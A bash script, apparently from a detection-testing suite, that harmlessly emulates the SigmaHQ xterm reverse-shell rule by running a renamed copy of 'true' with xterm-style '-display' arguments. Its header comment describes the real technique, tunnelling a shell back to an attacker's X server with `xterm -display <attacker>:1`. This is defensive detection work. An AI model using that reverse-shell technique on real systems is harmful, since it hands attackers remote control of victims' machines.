#!/usr/bin/env bash
# sigmahq_xterm_reverse_shell.sh - benign SigmaHQ emulation (see sigmahq_nohup.sh header).
#
# What an attacker does: tunnel a shell back over X with xterm (T1059), e.g.
# `xterm -display <attacker>:1`, so the attacker's X server drives a terminal.
# The rule keys on an image whose name contains 'xterm', a command line with
# '-display', ending in ':1'. Harmless analogue: xterm is a heavy X11 closure and
# the detection is purely name + args, so this runs the stock `true` binary copied
# under a name containing 'xterm' from a scratch dir in HOME (NOT /tmp or /dev/shm,
# to avoid the tmp-exec rules) with the matching args; true ignores them and exits
# 0, nothing connects. The execve of an 'xterm' image with '-display ...:1', which
# the rule keys on, is real.
#
# Imitates (SigmaHQ): proc_creation_lnx_xterm_reverse_shell.yml - ATT&CK T1059
# Expected rule: proc_creation_lnx_xterm_reverse_shell
set -u

src="$(type -P true)"
[ -n "$src" ] || { echo "BANKEN-EMUL-SKIP: no true binary on PATH"; exit 0; }
d="${HOME:-/home/alice}/.bk-emul-xterm.$$"
mkdir -p "$d" 2>/dev/null || { echo "BANKEN-EMUL-SKIP: cannot create scratch dir"; exit 0; }
cp "$src" "$d/xterm" 2>/dev/null || { echo "BANKEN-EMUL-SKIP: cannot stage binary"; exit 0; }
"$d/xterm" -display 192.0.2.1:1 >/dev/null 2>&1 || true
rm -rf "$d" 2>/dev/null || true

exit 0
